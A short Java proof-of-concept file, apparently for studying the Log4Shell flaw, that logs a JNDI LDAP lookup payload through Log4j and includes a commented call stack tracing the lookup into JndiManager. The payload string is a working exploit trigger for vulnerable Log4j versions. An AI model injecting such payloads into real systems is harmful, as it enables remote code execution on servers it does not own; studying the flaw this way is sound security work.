import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnEXP {
    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        // 模拟用户输入恶意 payload
        String payload = "${jndi:ldap://127.0.0.1:1389/8a842r}";
        logger.error(payload); // 触发漏洞
        /*
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:345, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)
log:485, LoggerConfig (org.apache.logging.log4j.core.config)
log:460, LoggerConfig (org.apache.logging.log4j.core.config)
log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2198, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2152, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2135, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2011, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:10, VulnEXP
         */
    }
}
